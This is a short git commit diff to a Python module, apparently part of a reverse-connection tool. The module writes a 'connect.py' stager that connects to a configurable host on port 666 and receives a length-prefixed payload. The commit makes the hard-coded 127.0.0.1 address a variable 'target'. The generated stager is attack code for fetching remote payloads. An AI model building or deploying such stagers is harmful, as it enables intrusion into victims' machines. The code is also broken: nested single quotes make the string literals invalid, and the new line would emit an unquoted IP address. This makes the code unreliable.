08376bc2c00a3c563d0608560a1d60dbf599de63
ST4LK3RCR4ZY <a_netocosta30@hotmail.com>
2016-12-25 16:17:07 -0300

    Update creverse.py

--- modules/creverse.py
+++ modules/creverse.py
@@ -1,12 +1,13 @@
 import socket,struct,os
 
+target = "127.0.0.1"
 
 def ran():
 	l = open('connect.py','w')
         l.write('import socket,struct\n')
 	l.write('\n')
 	l.write('s=socket.socket(2,socket.SOCK_STREAM)\n')
-	l.write('s.connect(('127.0.0.1',666))\n')
+	l.write('s.connect(('+target+',666))\n')
 	l.write('l=struct.unpack('>I',s.recv(4))[0]\n')
 	l.write('d=s.recv(l)\n')
 	l.write('	d+=s.recv(l-len(d))\n')
